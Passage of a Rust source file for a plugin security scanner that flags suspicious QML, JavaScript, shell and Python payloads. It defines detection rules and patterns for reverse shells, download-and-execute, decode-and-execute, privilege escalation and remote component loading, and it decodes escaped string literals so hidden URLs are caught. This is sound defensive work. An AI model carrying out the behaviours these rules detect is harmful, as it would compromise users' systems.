//! S3 detectors: capability observation, suspicious-provenance findings, and
//! invocation-edge resolution over an ingested payload inventory.
//!
//! The rule contract separates ability from suspicion: seeing `Process`,
//! `execDetached`, `FileView`, or a network sink records a capability
//! occurrence; emitting a fingerprintable finding requires suspicious
//! provenance — shell-interpreter chains (`sh -c …`), dynamically composed
//! commands, or a network-response-to-execution chain in the same file.
//!
//! Evidence quality follows the build: with the `qml-parser` feature QML is
//! parsed and conclusions are [`Confidence::AstBacked`]; without it — and for
//! standalone `.js` resources, which the QML grammar cannot parse cleanly —
//! detection is line-lexical and labelled [`Confidence::LexicalFallback`] so
//! report consumers can weigh it accordingly (ADR 0001).
//!
//! Nothing here executes scanned content; parsing and scanning are inert.

use std::collections::{BTreeMap, BTreeSet};

use omasafe_core::bounds::{MAX_EVIDENCE_BYTES_PER_RESULT, MAX_FILE_BYTES, MAX_SINK_REJECTIONS};
use omasafe_report::analysis::{
    CapabilityOccurrence, InvocationEdge, ParserMetadata, RenderedFinding,
};

use crate::TimeBudget;
use crate::fingerprint::{Confidence, NormalizedResult};
use crate::payload::{CoverageState, PayloadEntry, PayloadInventory, PayloadKind};
use crate::rules::{Capability, Language, Severity, rule};

/// Everything one analysis pass produced.
#[derive(Debug, Default)]
pub struct AnalysisArtifacts {
    /// Fingerprintable normalized results (suspicious provenance only).
    pub results: Vec<NormalizedResult>,
    /// Ability observations that never assert malicious intent.
    pub capabilities: Vec<CapabilityOccurrence>,
    /// Resolved literal references between analyzed files.
    pub edges: Vec<InvocationEdge>,
    /// Analysis-level disclosures (budget exhaustion, unavailable content).
    pub limitations: Vec<String>,
}

impl AnalysisArtifacts {
    /// Deterministic rendered findings joined with catalog facts. Duplicate
    /// normalized results collapse so repeated sinks render once.
    pub fn rendered_findings(&self) -> Vec<RenderedFinding> {
        let mut seen = std::collections::BTreeSet::new();
        let mut rendered = Vec::new();
        for result in &self.results {
            let key = (
                result.rule_id().to_owned(),
                result.relative_path().to_owned(),
                result.line(),
                result.semantic_value().to_owned(),
            );
            if !seen.insert(key) {
                continue;
            }
            let Some(definition) = rule(result.rule_id()) else {
                continue;
            };
            rendered.push((
                definition.default_severity,
                RenderedFinding {
                    rule_id: definition.id.to_owned(),
                    title: definition.title.to_owned(),
                    severity: definition.default_severity.to_string(),
                    language: definition.language.to_string(),
                    capability: definition.capability.to_string(),
                    relative_path: result.relative_path().to_owned(),
                    line: result.line(),
                    evidence: truncate_bytes(
                        result.semantic_value(),
                        MAX_EVIDENCE_BYTES_PER_RESULT,
                    ),
                    confidence: result.confidence().map(|confidence| match confidence {
                        Confidence::AstBacked => "ast-backed".to_owned(),
                        Confidence::LexicalFallback => "lexical-fallback".to_owned(),
                    }),
                    explanation: definition.summary.to_owned(),
                    review_guidance: definition.review_guidance.to_owned(),
                },
            ));
        }
        // Priority surfaces first: highest severity dominates the report view,
        // with stable path/rule/line ordering within a severity band.
        rendered.sort_by(|(severity_a, finding_a), (severity_b, finding_b)| {
            severity_b.cmp(severity_a).then_with(|| {
                (
                    &finding_a.relative_path,
                    &finding_a.rule_id,
                    finding_a.line,
                    &finding_a.evidence,
                )
                    .cmp(&(
                        &finding_b.relative_path,
                        &finding_b.rule_id,
                        finding_b.line,
                        &finding_b.evidence,
                    ))
            })
        });
        rendered.into_iter().map(|(_, finding)| finding).collect()
    }

    /// Highest finding severity, for `--fail-on` threshold decisions.
    pub fn max_severity(&self) -> Option<Severity> {
        self.results
            .iter()
            .filter_map(|result| rule(result.rule_id()))
            .map(|definition| definition.default_severity)
            .max()
    }
}

/// Parser identity for report embedding; `None` in lexical-fallback builds.
pub fn parser_metadata() -> Option<ParserMetadata> {
    #[cfg(feature = "qml-parser")]
    {
        let identity = crate::qml::qml_parser_identity();
        Some(ParserMetadata {
            grammar: identity.grammar.to_owned(),
            grammar_version: identity.grammar_version.to_owned(),
            tree_sitter_version: identity.tree_sitter_version.to_owned(),
            language_abi_version: identity.language_abi_version,
        })
    }
    #[cfg(not(feature = "qml-parser"))]
    None
}

fn truncate_bytes(value: &str, cap: usize) -> String {
    if value.len() <= cap {
        return value.to_owned();
    }
    let mut end = cap;
    while end > 0 && !value.is_char_boundary(end) {
        end -= 1;
    }
    format!("{}…", &value[..end])
}

/// Run every detector over a fully ingested inventory. `read_content` must
/// return bounded bytes for an entry; entries without a detector are skipped.
///
/// On return the inventory's analyzable entries carry final coverage states:
/// `analyzed` (findings reference them), `partial` (syntax errors degraded the
/// parse), or `unreferenced` (fully analyzed and reachable analysis found
/// nothing). Edge targets gain `referenced = true`.
pub fn analyze_inventory(
    inventory: &mut PayloadInventory,
    read_content: &dyn Fn(&PayloadEntry) -> Option<Vec<u8>>,
    budget: &TimeBudget,
) -> AnalysisArtifacts {
    let mut artifacts = AnalysisArtifacts::default();
    let mut by_path: BTreeMap<String, usize> = BTreeMap::new();
    for (index, entry) in inventory.entries.iter().enumerate() {
        by_path.insert(entry.relative_path.clone(), index);
    }

    struct PendingEdge {
        from_path: String,
        line: u32,
        value: String,
        sink: Option<SinkPosition>,
    }
    let mut pending_edges: Vec<PendingEdge> = Vec::new();

    for index in 0..inventory.entries.len() {
        if budget.expired() {
            artifacts
                .limitations
                .push("analysis_time_budget_exhausted".to_owned());
            break;
        }
        let entry = inventory.entries[index].clone();

        // Plugin manifests feed context results/capabilities (bar kind,
        // headless services). They are not language analysis.
        if entry.relative_path.ends_with("/manifest.json") || entry.relative_path == "manifest.json"
        {
            if entry.size <= MAX_FILE_BYTES {
                if let Some(content) = read_content(&entry) {
                    apply_manifest_context(&content, &entry.relative_path, &mut artifacts);
                } else {
                    artifacts
                        .limitations
                        .push(format!("content_unavailable:{}", entry.relative_path));
                }
            }
            continue;
        }

        let analyzable = matches!(
            entry.kind,
            PayloadKind::Qml | PayloadKind::JavaScript | PayloadKind::Shell | PayloadKind::Python
        );
        if !analyzable
            || !matches!(entry.coverage_state, CoverageState::Unsupported)
            || entry.size > MAX_FILE_BYTES
        {
            continue;
        }
        let Some(content) = read_content(&entry) else {
            artifacts
                .limitations
                .push(format!("content_unavailable:{}", entry.relative_path));
            continue;
        };
        let source = String::from_utf8_lossy(&content).into_owned();

        let entry_kind = entry.kind;
        let mut outcome = match &entry_kind {
            PayloadKind::Qml => analyze_qml_source(&source),
            PayloadKind::JavaScript => analyze_javascript_source(&source),
            kind @ (PayloadKind::Shell | PayloadKind::Python) => {
                let script_kind = kind.clone();
                analyze_script_source(&source, script_kind)
            }
            _ => unreachable!("kinds filtered above"),
        };

        // Anchor results onto the entry's canonical relative path.
        for candidate in &outcome.result_parts {
            if let Ok(normalized) = NormalizedResult::new(
                candidate.rule_id,
                &entry.relative_path,
                candidate.line,
                None,
                candidate.semantic_value.clone(),
                Some(candidate.confidence),
            ) {
                artifacts.results.push(normalized);
            }
        }
        for limitation in &outcome.limitations {
            artifacts
                .limitations
                .push(format!("{limitation}:{}", entry.relative_path));
        }
        for capability in &mut outcome.capabilities {
            capability.relative_path = entry.relative_path.clone();
            capability.confidence = Some(
                match outcome.confidence {
                    Confidence::AstBacked => "ast-backed",
                    Confidence::LexicalFallback => "lexical-fallback",
                }
                .to_owned(),
            );
        }
        // Decide the coverage state BEFORE draining observations.
        let produced_observations = outcome.has_findings() || !outcome.capabilities.is_empty();
        artifacts.capabilities.append(&mut outcome.capabilities);
        for candidate in outcome.references.drain(..) {
            pending_edges.push(PendingEdge {
                from_path: entry.relative_path.clone(),
                line: candidate.line,
                value: candidate.value,
                sink: candidate.sink,
            });
        }

        // `analyzed` means detectors produced observations (findings or
        // capabilities); `unreferenced` means they ran and saw nothing.
        // Shell/Python are always `partial`: minimal lexical coverage means
        // no match never implies clean behavior. Parse-degraded QML/JS is
        // likewise partial.
        inventory.entries[index].coverage_state =
            if matches!(entry_kind, PayloadKind::Shell | PayloadKind::Python)
                || outcome.parse_degraded
            {
                CoverageState::Partial
            } else if produced_observations {
                CoverageState::Analyzed
            } else {
                CoverageState::Unreferenced
            };
    }

    // Resolve literal references strictly inside the logical root. The loop
    // honors the analysis time budget (H2 review) and retains at most
    // MAX_SINK_REJECTIONS unique typed rejections, disclosing overflow
    // separately instead of expanding limitation strings without bound. The
    // cap is applied to the set of unique strings — deduplication happens as
    // rejections are collected, not after a fixed-size prefix is filled — so a
    // later unique rejection is never crowded out by earlier duplicates, and
    // duplicate-only input never reports truncation.
    let mut resolved: Vec<InvocationEdge> = Vec::new();
    let mut sink_rejections: BTreeSet<String> = BTreeSet::new();
    let mut sink_rejections_omitted = 0usize;
    for edge in pending_edges {
        if budget.expired() {
            let disclosed = artifacts
                .limitations
                .iter()
                .any(|limitation| limitation == "analysis_time_budget_exhausted");
            if !disclosed {
                artifacts
                    .limitations
                    .push("analysis_time_budget_exhausted".to_owned());
            }
            break;
        }
        let Some(target_index) =
            resolve_reference(inventory, &by_path, &edge.from_path, &edge.value)
        else {
            // Rejected references are disclosed only for verified sink
            // positions, with a typed reason (R-2). Non-sink path-shaped
            // strings stay inventory context, exactly as before.
            if edge.sink.is_some() {
                let rejection = format!(
                    "sink-reference-rejected:{}:{}:{}:{}",
                    rejection_reason(&edge.value),
                    edge.from_path,
                    edge.line,
                    edge.value
                );
                // A rejection already disclosed verbatim (retained in the
                // set) carries no new information. A rejection that cannot
                // be retained because the set is full is omitted: every such
                // occurrence is counted, because remembering WHICH values
                // were omitted would need unbounded fingerprints under
                // adversarial input — the truncation count is deliberately
                // an occurrence count, never a unique count (H2 review).
                if sink_rejections.contains(&rejection) {
                    // Already disclosed.
                } else if sink_rejections.len() < MAX_SINK_REJECTIONS {
                    sink_rejections.insert(rejection);
                } else {
                    sink_rejections_omitted += 1;
                }
            }
            continue;
        };
        inventory.entries[target_index].invocation_target = true;
        resolved.push(InvocationEdge {
            from_path: edge.from_path,
            line: Some(edge.line),
            target_path: inventory.entries[target_index].relative_path.clone(),
        });
    }
    // BTreeSet already yields sorted, unique strings.
    artifacts.limitations.extend(sink_rejections);
    if sink_rejections_omitted > 0 {
        artifacts.limitations.push(format!(
            "sink-reference-rejections-truncated:{sink_rejections_omitted}"
        ));
    }
    resolved.sort_by(|a, b| (&a.from_path, &a.target_path).cmp(&(&b.from_path, &b.target_path)));
    resolved.dedup_by(|a, b| a.from_path == b.from_path && a.target_path == b.target_path);
    artifacts.edges = resolved;

    artifacts.capabilities.sort_by(|a, b| {
        (&a.capability, &a.relative_path, a.line, &a.detail).cmp(&(
            &b.capability,
            &b.relative_path,
            b.line,
            &b.detail,
        ))
    });
    artifacts.capabilities.dedup_by(|a, b| {
        a.capability == b.capability
            && a.relative_path == b.relative_path
            && a.line == b.line
            && a.detail == b.detail
    });

    artifacts
}

/// Resolve one literal reference against the inventory: plain relative paths
/// to inventoried files only — never traversal segments, schemes, absolute
/// paths, directories, or symlinks. Any bundled file can be an invocation
/// target (`Loader` sources, `FileView` paths, script payloads alike); the
/// existence check against the inventory is what keeps ordinary prose out.
/// Cheap path-likeness prefilter; the inventory existence check in
/// [`resolve_reference`] is the real gate.
fn is_path_shaped(value: &str) -> bool {
    if value.is_empty() || value.len() > 512 {
        return false;
    }
    value.contains('/') || (value.contains('.') && !value.contains(' '))
}

fn resolve_reference(
    inventory: &PayloadInventory,
    by_path: &BTreeMap<String, usize>,
    from_path: &str,
    value: &str,
) -> Option<usize> {
    if value.is_empty()
        || value.len() > 512
        || value.starts_with('/')
        || value.contains(':')
        || value.contains(' ')
        || value.contains('\n')
    {
        return None;
    }
    // Leading "./" is ordinary relative spelling; only inner traversal
    // segments are hostile.
    let stripped = value.trim_start_matches("./");
    if stripped.is_empty()
        || stripped
            .split('/')
            .any(|segment| segment == "." || segment == "..")
    {
        return None;
    }
    // QML/JS references resolve relative to the referencing file first;
    // repository-root-relative spellings are the fallback.
    let mut candidate_paths: Vec<String> = Vec::new();
    if let Some((directory, _file)) = from_path.rsplit_once('/') {
        candidate_paths.push(format!("{}/{}", directory, stripped));
    }
    candidate_paths.push(stripped.to_owned());
    for candidate in candidate_paths {
        if let Some(index) = by_path.get(candidate.as_str()) {
            if matches!(
                inventory.entries[*index].kind,
                PayloadKind::Symlink | PayloadKind::Directory | PayloadKind::Special
            ) {
                return None;
            }
            return Some(*index);
        }
    }
    None
}

/// Verified sink positions for reference candidates (H2). A path-shaped
/// string at one of these positions is a real load or execution input, so a
/// failed in-tree resolution is disclosed with a typed reason; path-shaped
/// strings anywhere else stay inventory context (R-2).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum SinkPosition {
    LoaderSource,
    CreateComponent,
    Include,
    ProcessCommand,
    ExecDetached,
    FileViewPath,
}

impl SinkPosition {
    fn label(self) -> &'static str {
        match self {
            SinkPosition::LoaderSource => "Loader.source",
            SinkPosition::CreateComponent => "Qt.createComponent",
            SinkPosition::Include => "Qt.include",
            SinkPosition::ProcessCommand => "Process.command",
            SinkPosition::ExecDetached => "execDetached",
            SinkPosition::FileViewPath => "FileView.path",
        }
    }
}

/// One reference candidate collected during per-file analysis. `sink` marks
/// verified sink positions; unmarked candidates are inventory context only.
#[derive(Debug, Clone, PartialEq, Eq)]
struct ReferenceCandidate {
    line: u32,
    value: String,
    sink: Option<SinkPosition>,
}

/// Centralized scheme parsing for reference classification (H2 review):
/// URI schemes are case-insensitive (RFC 3986), so `HTTPS://…` must reach
/// the same verdict as its lowercase spelling, and one parser feeds rejection
/// reasons, the remote-load family, and the out-of-tree family so the three
/// can never disagree about the same literal. The remote set is the network
/// transports Qt's component loader accepts on the pinned runtime; `file`
/// denotes a local path, so it is an out-of-tree load, never remote.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum SchemeClass {
    Remote,
    LocalFile,
    Other,
}

fn scheme_class(value: &str) -> Option<SchemeClass> {
    let position = value.find(':')?;
    let scheme = &value[..position];
    let mut chars = scheme.chars();
    if !chars
        .next()
        .is_some_and(|first| first.is_ascii_alphabetic())
    {
        return None;
    }
    if !chars.all(|char| char.is_ascii_alphanumeric() || matches!(char, '+' | '-' | '.')) {
        return None;
    }
    if scheme.eq_ignore_ascii_case("http") || scheme.eq_ignore_ascii_case("https") {
        return Some(SchemeClass::Remote);
    }
    if scheme.eq_ignore_ascii_case("file") {
        return Some(SchemeClass::LocalFile);
    }
    Some(SchemeClass::Other)
}

/// Typed reason a reference cannot resolve in-tree, mirroring
/// [`resolve_reference`]'s rejection conditions so reports can triage it
/// (R-2): `remote`, `absolute`, `traversal`, `missing-local-target`,
/// `unsupported-scheme`. A `file://` URL names a local path outside the
/// tree, so its reason is `absolute`.
fn rejection_reason(value: &str) -> &'static str {
    match scheme_class(value) {
        Some(SchemeClass::Remote) => return "remote",
        Some(SchemeClass::LocalFile) => return "absolute",
        Some(SchemeClass::Other) => return "unsupported-scheme",
        None => {}
    }
    if value.starts_with('/') {
        return "absolute";
    }
    // Leading "./" is ordinary relative spelling; only inner traversal
    // segments are hostile (same rule as resolve_reference).
    let stripped = value.trim_start_matches("./");
    if stripped
        .split('/')
        .any(|segment| segment == "." || segment == "..")
    {
        return "traversal";
    }
    "missing-local-target"
}

/// Absolute-path, traversal, or `file://` spelling: content from outside the
/// reviewed plugin tree. Leading "./" is ordinary relative spelling, not
/// traversal.
fn is_out_of_tree_spelling(value: &str) -> bool {
    if value.starts_with('/') {
        return true;
    }
    if matches!(scheme_class(value), Some(SchemeClass::LocalFile)) {
        return true;
    }
    value
        .trim_start_matches("./")
        .split('/')
        .any(|segment| segment == "..")
}

/// Decode JS/QML string escape sequences so sink classification sees the
/// value the runtime evaluates: `"\x68ttps://…"` loads `https://…`, so
/// escaped literals must not slip past scheme detection (H2 review). Applies
/// exactly once, at string extraction; classification and evidence carry the
/// decoded runtime value. Unknown escapes decode to the escaped character
/// (JS semantics); a trailing backslash stays literal.
fn decode_js_escapes(content: &str) -> String {
    if !content.contains('\\') {
        return content.to_owned();
    }
    let mut decoded = String::with_capacity(content.len());
    let mut chars = content.chars().peekable();
    while let Some(current) = chars.next() {
        if current != '\\' {
            decoded.push(current);
            continue;
        }
        let Some(&next) = chars.peek() else {
            decoded.push('\\');
            break;
        };
        match next {
            // Line-continuation: backslash + LineTerminatorSequence evaluates
            // to the empty string, so `"ht\<LF>tps://…"` is `https://…` at
            // runtime. A CR + LF pair is a single terminator sequence.
            '\n' | '\u{2028}' | '\u{2029}' => {
                chars.next();
            }
            '\r' => {
                chars.next();
                if chars.peek() == Some(&'\n') {
                    chars.next();
                }
            }
            // Legacy octal escape (Annex B): backslash + 1–3 octal digits.
            // The first digit bounds the length — 0–3 allow three digits,
            // 4–7 only two — so `\1` is U+0001 and `\101` is 'A'. `\0` not
            // followed by an octal digit is NUL. `\8`/`\9` are not octal and
            // fall through to the identity arm below.
            '0'..='7' => {
                chars.next();
                let mut octal = String::new();
                octal.push(next);
                let max = if next <= '3' { 3 } else { 2 };
                while octal.len() < max
                    && chars.peek().is_some_and(|char| ('0'..='7').contains(char))
                {
                    octal.push(chars.next().unwrap());
                }
                let value = u32::from_str_radix(&octal, 8).unwrap_or(0);
                decoded.push(char::from_u32(value).unwrap_or('\u{FFFD}'));
            }
            'n' | 'r' | 't' | 'b' | 'f' | 'v' => {
                decoded.push(match next {
                    'n' => '\n',
                    'r' => '\r',
                    't' => '\t',
                    'b' => '\u{0008}',
                    'f' => '\u{000C}',
                    _ => '\u{000B}',
                });
                chars.next();
            }
            'x' => {
                chars.next();
                let mut hex = String::new();
                while hex.len() < 2 && chars.peek().is_some_and(|char| char.is_ascii_hexdigit()) {
                    hex.push(chars.next().unwrap());
                }
                if hex.len() == 2 {
                    let value = u32::from_str_radix(&hex, 16).unwrap_or(0);
                    decoded.push(char::from_u32(value).unwrap_or('\u{FFFD}'));
                } else {
                    decoded.push_str("\\x");
                    decoded.push_str(&hex);
                }
            }
            'u' => {
                chars.next();
                if chars.peek() == Some(&'{') {
                    chars.next();
                    let mut hex = String::new();
                    while hex.len() < 6 && chars.peek().is_some_and(|char| char.is_ascii_hexdigit())
                    {
                        hex.push(chars.next().unwrap());
                    }
                    if chars.peek() == Some(&'}')
                        && let Some(value) =
                            u32::from_str_radix(&hex, 16).ok().and_then(char::from_u32)
                    {
                        chars.next();
                        decoded.push(value);
                    } else {
                        decoded.push_str("\\u{");
                        decoded.push_str(&hex);
                    }
                } else {
                    let mut hex = String::new();
                    while hex.len() < 4 && chars.peek().is_some_and(|char| char.is_ascii_hexdigit())
                    {
                        hex.push(chars.next().unwrap());
                    }
                    if hex.len() == 4 {
                        let value = u32::from_str_radix(&hex, 16).unwrap_or(0);
                        decoded.push(char::from_u32(value).unwrap_or('\u{FFFD}'));
                    } else {
                        decoded.push_str("\\u");
                        decoded.push_str(&hex);
                    }
                }
            }
            '\'' | '"' | '`' | '\\' | '/' => {
                decoded.push(next);
                chars.next();
            }
            // Unknown escape: JS keeps the escaped character, drops the
            // backslash.
            other => {
                decoded.push(other);
                chars.next();
            }
        }
    }
    decoded
}

/// Findings for literals at load sinks (H2). Network schemes at the two
/// verified reachable load positions (H0 record) are the High
/// remote-component-load family; absolute/traversal spellings at load sinks
/// are unreviewed out-of-tree loads (Medium) — not sandbox escapes. Plain
/// relative spellings carry no finding: they resolve as inventory edges or
/// surface a typed rejection.
fn load_sink_finding(
    value: &str,
    sink: SinkPosition,
    line: u32,
    confidence: Confidence,
) -> Option<ResultParts> {
    let remote = matches!(scheme_class(value), Some(SchemeClass::Remote));
    if remote
        && matches!(
            sink,
            SinkPosition::LoaderSource | SinkPosition::CreateComponent
        )
    {
        return Some(parts(
            REMOTE_COMPONENT_LOAD_RULE,
            line,
            format!("remote-component-load:{}:{value}", sink.label()),
            confidence,
        ));
    }
    if matches!(
        sink,
        SinkPosition::LoaderSource | SinkPosition::CreateComponent | SinkPosition::Include
    ) && is_out_of_tree_spelling(value)
    {
        return Some(parts(
            OUT_OF_TREE_REFERENCE_RULE,
            line,
            format!("out-of-tree-reference:{}:{value}", sink.label()),
            confidence,
        ));
    }
    None
}

/// Record one sink-position literal: a load-sink finding when the spelling
/// carries one, otherwise a sink-marked reference candidate for in-tree
/// resolution (edge or typed rejection).
fn record_sink_reference(text: &str, sink: SinkPosition, line: u32, outcome: &mut FileOutcome) {
    if let Some(finding) = load_sink_finding(text, sink, line, outcome.confidence) {
        outcome.result_parts.push(finding);
        return;
    }
    if is_path_shaped(text) {
        outcome.references.push(ReferenceCandidate {
            line,
            value: text.to_owned(),
            sink: Some(sink),
        });
    }
}

/// Directory-import specifier handling, shared by the AST and lexical paths
/// (H2). Remote schemes record the verified-scanner-intercepted indicator —
/// never the High remote-load family; absolute/traversal spellings are
/// reachable local out-of-tree loads and carry the Medium finding. Plain
/// relative imports are ordinary QML and stay silent.
fn apply_directory_import(specifier: &str, line: u32, outcome: &mut FileOutcome) {
    let remote = matches!(scheme_class(specifier), Some(SchemeClass::Remote));
    if remote {
        outcome.result_parts.push(parts(
            REMOTE_DIRECTORY_IMPORT_RULE,
            line,
            format!("remote-directory-import:{specifier}"),
            outcome.confidence,
        ));
        return;
    }
    if is_out_of_tree_spelling(specifier) {
        outcome.result_parts.push(parts(
            OUT_OF_TREE_REFERENCE_RULE,
            line,
            format!("out-of-tree-reference:directory-import:{specifier}"),
            outcome.confidence,
        ));
    }
}

/// Per-file detector output before cross-file anchoring.
struct FileOutcome {
    result_parts: Vec<ResultParts>,
    capabilities: Vec<CapabilityOccurrence>,
    references: Vec<ReferenceCandidate>,
    parse_degraded: bool,
    confidence: Confidence,
    /// Coverage limitations this file's analysis hit (budget exhaustion),
    /// anchored onto the entry path when artifacts are assembled.
    limitations: Vec<String>,
}

impl FileOutcome {
    fn has_findings(&self) -> bool {
        !self.result_parts.is_empty()
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum SinkKind {
    Process,
    DetachedExecution,
}

const PROCESS_RULE: &str = "oma.qml.process-execution";
const DETACHED_RULE: &str = "oma.qml.detached-execution";
#[cfg_attr(not(test), allow(dead_code))]
const NETWORK_RULE: &str = "oma.qml.network-access";
#[cfg(feature = "qml-parser")]
const DYNAMIC_REFERENCE_RULE: &str = "oma.qml.dynamic-reference";
#[cfg_attr(not(test), allow(dead_code))]
const DYNAMIC_CODE_RULE: &str = "oma.qml.dynamic-code";
#[cfg_attr(not(test), allow(dead_code))]
const OBFUSCATION_RULE: &str = "oma.qml.obfuscated-payload-indicator";
const PERSISTENCE_RULE: &str = "oma.qml.persistence-scheduling";
const REMOTE_COMPONENT_LOAD_RULE: &str = "oma.qml.remote-component-load";
const REMOTE_DIRECTORY_IMPORT_RULE: &str = "oma.qml.remote-directory-import";
const OUT_OF_TREE_REFERENCE_RULE: &str = "oma.qml.out-of-tree-reference";
const SCRIPT_DOWNLOAD_EXECUTE_RULE: &str = "oma.script.download-execute";
const SCRIPT_PRIVILEGE_RULE: &str = "oma.script.privilege-escalation";
const PYTHON_DOWNLOAD_EXECUTE_RULE: &str = "oma.python.download-execute";
const PYTHON_PRIVILEGE_RULE: &str = "oma.python.privilege-escalation";
const SCRIPT_REVERSE_SHELL_RULE: &str = "oma.script.reverse-shell";
const PYTHON_REVERSE_SHELL_RULE: &str = "oma.python.reverse-shell";
const SCRIPT_DECODE_EXECUTE_RULE: &str = "oma.script.decode-execute";
const SHARED_TEMP_INDICATOR_RULE: &str = "oma.script.privileged-shared-temp";
const SHARED_TEMP_CONTROLLED_RULE: &str = "oma.script.privileged-shared-temp-controlled";
const REPLACES_BAR_RULE: &str = "oma.context.replaces-bar";

struct LexFlags {
    detached_any: Option<u32>,
    network: Option<u32>,
}

fn parts(
    rule_id: &'static str,
    line: u32,
    semantic_value: impl Into<String>,
    confidence: Confidence,
) -> ResultParts {
    ResultParts {
        rule_id,
        line: Some(line),
        semantic_value: truncate_bytes(&semantic_value.into(), MAX_EVIDENCE_BYTES_PER_RESULT),
        confidence,
    }
}

fn occurrence(
    capability: Capability,
    language: Language,
    line: u32,
    detail: &str,
) -> CapabilityOccurrence {
    // Script-language capability context has no dedicated catalog rule yet;
    // attributing it to QML rules would produce misleading guidance.
    let covering_rule = if matches!(language, Language::Shell | Language::Python) {
        None
    } else {
        capability_covering_rule(capability)
    }
    .and_then(crate::rules::rule);
    CapabilityOccurrence {
        capability: capability.to_string(),
        language: language.to_string(),
        relative_path: String::new(),
        line: Some(line),
        source_rule_id: covering_rule.map(|definition| definition.id.to_owned()),
        detail: truncate_bytes(detail, 200),
        confidence: None,
        explanation: covering_rule
            .map(|definition| definition.summary.to_owned())
            .unwrap_or_else(|| {
                "script capability observed; lexical coverage is minimal by design".to_owned()
            }),
        review_guidance: covering_rule
            .map(|definition| definition.review_guidance.to_owned())
            .unwrap_or_else(|| "Review the surrounding script manually".to_owned()),
    }
}

fn capability_covering_rule(capability: Capability) -> Option<&'static str> {
    match capability {
        Capability::ProcessExecution => Some("oma.qml.process-execution"),
        Capability::DetachedProcessExecution => Some("oma.qml.detached-execution"),
        Capability::FilesystemAccess => Some("oma.qml.filesystem-access"),
        Capability::NetworkAccess => Some("oma.qml.network-access"),
        Capability::PersistenceScheduling => Some(PERSISTENCE_RULE),
        Capability::ClipboardAccess => Some("oma.qml.clipboard-access"),
        Capability::CompositorControl => Some("oma.qml.compositor-control"),
        Capability::PolkitAgentUi => Some("oma.qml.polkit-agent-ui"),
        Capability::SessionLockSurface => Some("oma.qml.session-lock"),
        Capability::PamAuthentication => Some("oma.qml.pam-authentication"),
        Capability::DynamicCodeExecution => Some(DYNAMIC_CODE_RULE),
        _ => None,
    }
}

/// Shell-interpreter invocation inside a command string: an interpreter word
/// followed (after whitespace) by a `-c`-style flag. Returns the byte offset
/// of the interpreter word for evidence trimming.
fn find_shell_interpreter(text: &str) -> Option<usize> {
    const INTERPRETERS: [&str; 6] = ["sh", "bash", "zsh", "dash", "ksh", "ash"];
    let bytes = text.as_bytes();
    let mut position = 0usize;
    while position < bytes.len() {
        // Advance to the next word start; path separators stay inside words
        // so `/bin/sh -c` scans as basename `sh`.
        while position < bytes.len()
            && !bytes[position].is_ascii_alphanumeric()
            && bytes[position] != b'/'
        {
            position += 1;
        }
        if position >= bytes.len() {
            break;
        }
        let start = position;
        while position < bytes.len()
            && (bytes[position].is_ascii_alphanumeric() || bytes[position] == b'/')
        {
            position += 1;
        }
        let word = &text[start..position];
        let basename = word.rsplit('/').next().unwrap_or(word);
        if INTERPRETERS.contains(&basename) {
            // Skip whitespace, then require a `-c…` style flag.
            let mut cursor = position;
            while cursor < bytes.len() && (bytes[cursor] == b' ' || bytes[cursor] == b'\t') {
                cursor += 1;
            }
            if cursor + 1 < bytes.len()
                && bytes[cursor] == b'-'
                && bytes[cursor + 1] == b'c'
                && (cursor + 2 == bytes.len()
                    || bytes[cursor + 2] == b' '
                    || bytes[cursor + 2] == b'\t')
            {
                return Some(start);
            }
        }
        // Skip past this word even when it did not match.
        while position < bytes.len() && bytes[position] != b' ' {
            position += 1;
        }
    }
    None
}

// ---------------------------------------------------------------------------
// Lexical analysis: standalone .js always, and all QML in fallback builds.
// ---------------------------------------------------------------------------

fn lexical_scan(source: &str, language: Language) -> FileOutcome {
    let mut outcome = FileOutcome {
        result_parts: Vec::new(),
        capabilities: Vec::new(),
        references: Vec::new(),
        parse_degraded: false,
        confidence: Confidence::LexicalFallback,
        limitations: Vec::new(),
    };
    let mut flags = LexFlags {
        detached_any: None,
        network: None,
    };

    for (index, raw_line) in source.lines().enumerate() {
        let number = index as u32 + 1;
        // One shared quote-aware trim: commented-out code is invisible to
        // every detector below, while quoted text survives intact.
        let line = strip_line_comment(raw_line, CommentStyle::DoubleSlash);
        if line.is_empty() {
            continue;
        }
        // Every occurrence gets its own argument judgment: a benign first
        // call must not mask a suspicious later one.
        let mut search_from = 0usize;
        while let Some(relative_offset) = find_word(&line[search_from..], "execDetached") {
            let offset = search_from + relative_offset;
            search_from = offset + "execDetached".len();
            flags.detached_any.get_or_insert(number);
            outcome.capabilities.push(occurrence(
                Capability::DetachedProcessExecution,
                language,
                number,
                &line[offset..],
            ));
            // The call's own paren: first '(' after the name, skipping only
            // whitespace.
            let mut cursor = search_from;
            while cursor < line.len() && matches!(line.as_bytes()[cursor], b' ' | b'\t') {
                cursor += 1;
            }
            if cursor < line.len()
                && line.as_bytes()[cursor] == b'('
                && let Some((start, end)) = balanced_bracket_span(line, cursor)
            {
                evaluate_execution_span(
                    &line[start..end],
                    SinkKind::DetachedExecution,
                    number,
                    &mut outcome,
                );
                // The executed path is also a reference sink (H2): literals
                // inside the argument span only, never the whole line.
                for literal in span_sink_literals(&line[start..end]) {
                    record_sink_reference(
                        &literal,
                        SinkPosition::ExecDetached,
                        number,
                        &mut outcome,
                    );
                }
            }
        }
        let is_network_line = line.contains("new XMLHttpRequest")
            || find_word(line, "fetch(").is_some()
            || line.contains("WebSocket");
        if is_network_line {
            flags.network.get_or_insert(number);
            outcome.capabilities.push(occurrence(
                Capability::NetworkAccess,
                language,
                number,
                line.trim(),
            ));
        }
        if find_word(line, "FileView").is_some() {
            outcome.capabilities.push(occurrence(
                Capability::FilesystemAccess,
                language,
                number,
                line.trim(),
            ));
        }
        if find_word(line, "Timer").is_some() {
            outcome.capabilities.push(occurrence(
                Capability::PersistenceScheduling,
                language,
                number,
                line.trim(),
            ));
        }
        if find_word(line, "Process").is_some() {
            // Every `command` binding gets its own judgment; the line is
            // already comment-trimmed by strip_line_comment.
            let mut search_from = 0usize;
            while let Some(relative_offset) = find_word(&line[search_from..], "command") {
                let word = search_from + relative_offset;
                search_from = word + "command".len();
                outcome.capabilities.push(occurrence(
                    Capability::ProcessExecution,
                    language,
                    number,
                    line.trim(),
                ));
                // Suspicious provenance only, judged on the binding value:
                // shell-interpreter chains or network response data. Command
                // argv is also a verified sink position (H2): literal
                // arguments inside the binding value span only — a bare
